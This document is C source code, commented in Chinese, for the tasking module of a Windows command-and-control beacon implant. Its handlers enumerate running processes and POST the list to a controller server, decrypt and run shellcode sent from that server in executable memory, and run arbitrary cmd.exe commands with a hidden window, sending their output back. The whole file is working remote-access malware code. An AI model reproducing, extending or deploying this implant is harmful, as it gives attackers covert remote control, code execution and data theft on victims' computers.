#include "beacon.h"
#include <stdint.h>

// Sleep任务处理
BEACON_ERROR handle_sleep_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    DWORD new_sleep_time = atoi(task_data);
    if (new_sleep_time > 0) {
        config->sleep_time = new_sleep_time;
    }

    return BEACON_SUCCESS;
}

// 收集进程信息
static BEACON_ERROR collect_process_info(char** json_data, size_t* offset, size_t* capacity) {
    if (!json_data || !*json_data || !offset || !capacity || *capacity == 0) {
        return BEACON_ERROR_PARAMS;
    }

    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    BOOL isFirst = TRUE;
    int process_count = 0;

    // 创建进程快照
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return BEACON_ERROR_SYSTEM;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // 开始JSON数组
    *offset += _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1,
        "{\n  \"processes\": [\n");

    // 遍历进程
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // 检查缓冲区大小，如果剩余空间小于2KB则扩展缓冲区
            if (*capacity - *offset < 2048) {
                size_t new_capacity = *capacity * 2;
                char* new_buffer = (char*)realloc(*json_data, new_capacity);
                if (!new_buffer) {
                    CloseHandle(hSnapshot);
                    return BEACON_ERROR_MEMORY;
                }
                *json_data = new_buffer;  // 更新调用者的指针
                *capacity = new_capacity;
            }

            // 获取进程路径
            WCHAR fullPath[MAX_PATH] = L"N/A";
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                DWORD pathLen = MAX_PATH;
                if (!QueryFullProcessImageNameW(hProcess, 0, fullPath, &pathLen)) {
                    wcscpy_s(fullPath, MAX_PATH, pe32.szExeFile);
                }
                CloseHandle(hProcess);
            }

            // 转换到UTF-8
            char processName[MAX_PATH] = { 0 };
            char processPath[MAX_PATH * 2] = { 0 };
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, processName, MAX_PATH, NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, fullPath, -1, processPath, MAX_PATH * 2, NULL, NULL);

            // 处理路径中的反斜杠
            for (char* p = processPath; *p; p++) {
                if (*p == '\\') {
                    memmove(p + 1, p, strlen(p) + 1);
                    *p++ = '\\';
                }
            }

            // 添加进程信息
            int written = _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1,
                "%s    {\n"
                "      \"pid\": %lu,\n"
                "      \"name\": \"%s\",\n"
                "      \"path\": \"%s\"\n"
                "    }",
                isFirst ? "" : ",\n", pe32.th32ProcessID, processName, processPath);

            if (written < 0 || written >= (int)(*capacity - *offset)) {
                CloseHandle(hSnapshot);
                return BEACON_ERROR_MEMORY;
            }

            *offset += written;
            isFirst = FALSE;
            process_count++;

        } while (Process32NextW(hSnapshot, &pe32));
    }

    // 关闭JSON数组
    int written = _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1, "\n  ]\n}");
    if (written < 0 || written >= (int)(*capacity - *offset)) {
        CloseHandle(hSnapshot);
        return BEACON_ERROR_MEMORY;
    }

    *offset += written;
    CloseHandle(hSnapshot);
    return BEACON_SUCCESS;
}

// 处理进程列表任务
BEACON_ERROR handle_proclist_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    size_t capacity = 1024 * 1024;  // 初始容量1MB
    char* json_data = (char*)malloc(capacity);
    if (!json_data) {
        return BEACON_ERROR_MEMORY;
    }

    size_t offset = 0;
    BEACON_ERROR error = collect_process_info(&json_data, &offset, &capacity);
    
    if (error == BEACON_SUCCESS) {
        // Base64编码JSON数据
        char* encoded_data = NULL;
        base64_encode((const unsigned char*)json_data, offset, &encoded_data);
        if (!encoded_data) {
            free(json_data);
            return BEACON_ERROR_MEMORY;
        }

        // 发送进程列表请求
        HTTP_REQUEST request = {
            .method = L"POST",
            .path = config->api_path,
            .data = encoded_data,
            .data_len = strlen(encoded_data),
            .timeout = 30000,
            .use_ssl = FALSE
        };

        char* response = NULL;
        DWORD response_len = 0;
        error = http_send_request(&request, &response, &response_len);

        if (response) {
            free(response);
        }
        free(encoded_data);
    }

    if (json_data) {
        free(json_data);
    }

    return error;
}

// 处理Shellcode任务
BEACON_ERROR handle_shellcode_task(const char* task_data, size_t data_len, BEACON_CONFIG* config) {
    if (!task_data || !config || data_len == 0) {
        return BEACON_ERROR_PARAMS;
    }

    // Base64解码shellcode数据
    void* decoded_data = NULL;
    size_t decoded_len = 0;
    BEACON_ERROR error = base64_decode(task_data, &decoded_data, &decoded_len);
    if (error != BEACON_SUCCESS || !decoded_data) {
        return error;
    }

    // 使用系统UUID(ProductId)解密shellcode
    char uuid_str[UUID_LENGTH] = {0};
    WideCharToMultiByte(CP_UTF8, 0, config->uuid, -1, uuid_str, UUID_LENGTH, NULL, NULL);
    xor_encrypt_decrypt((unsigned char*)decoded_data, decoded_len, uuid_str, strlen(uuid_str));

    // 分配内存
    LPVOID exec_buffer = VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_buffer) {
        free(decoded_data);
        return BEACON_ERROR_MEMORY;
    }

    // 复制解码后的shellcode
    memcpy(exec_buffer, decoded_data, decoded_len);
    free(decoded_data);  // 释放解码后的数据
    
    // 修改内存保护
    DWORD old_protect;
    if (!VirtualProtect(exec_buffer, decoded_len, PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(exec_buffer, 0, MEM_RELEASE);
        return BEACON_ERROR_SYSTEM;
    }

    // 创建线程执行shellcode
    HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_buffer, NULL, 0, NULL);
    if (!h_thread) {
        VirtualFree(exec_buffer, 0, MEM_RELEASE);
        return BEACON_ERROR_SYSTEM;
    }

    // 等待执行完成
    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_thread);
    VirtualFree(exec_buffer, 0, MEM_RELEASE);

    return BEACON_SUCCESS;
}

// 处理命令执行任务
BEACON_ERROR handle_execute_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    // 创建管道用于捕获输出
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return BEACON_ERROR_SYSTEM;
    }

    // 设置启动信息
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // 构造命令行
    char cmdLine[4096];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", task_data);

    // 创建进程
    BOOL success = CreateProcessA(
        NULL,           // 应用程序名
        cmdLine,        // 命令行
        NULL,           // 进程安全属性
        NULL,           // 线程安全属性
        TRUE,           // 继承句柄
        CREATE_NO_WINDOW, // 创建标志
        NULL,           // 环境
        NULL,           // 当前目录
        &si,            // 启动信息
        &pi             // 进程信息
    );

    CloseHandle(hWritePipe); // 关闭写端

    if (!success) {
        CloseHandle(hReadPipe);
        return BEACON_ERROR_SYSTEM;
    }

    // 等待进程完成，最多60秒
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000);

    // 读取输出
    char* output_buffer = (char*)malloc(65536); // 64KB缓冲区
    if (!output_buffer) {
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return BEACON_ERROR_MEMORY;
    }

    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    char tempBuffer[4096];

    // 读取所有输出
    while (ReadFile(hReadPipe, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead >= 65535) {
            break; // 防止缓冲区溢出
        }
        memcpy(output_buffer + totalBytes, tempBuffer, bytesRead);
        totalBytes += bytesRead;
    }
    output_buffer[totalBytes] = '\0';

    // 如果进程超时，终止进程
    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        strncat(output_buffer, "\n[Command execution timeout after 60 seconds]", 65535 - totalBytes - 1);
    }

    // 清理进程句柄
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    // 如果有输出，发送回服务器
    if (totalBytes > 0) {
        // Base64编码输出
        char* encoded_data = NULL;
        base64_encode((const unsigned char*)output_buffer, totalBytes, &encoded_data);
        if (encoded_data) {
            // 发送命令执行结果
            HTTP_REQUEST request = {
                .method = L"POST",
                .path = config->api_path,
                .data = encoded_data,
                .data_len = strlen(encoded_data),
                .timeout = 30000,
                .use_ssl = FALSE
            };

            char* response = NULL;
            DWORD response_len = 0;
            http_send_request(&request, &response, &response_len);

            if (response) {
                free(response);
            }
            free(encoded_data);
        }
    }

    free(output_buffer);
    return BEACON_SUCCESS;
}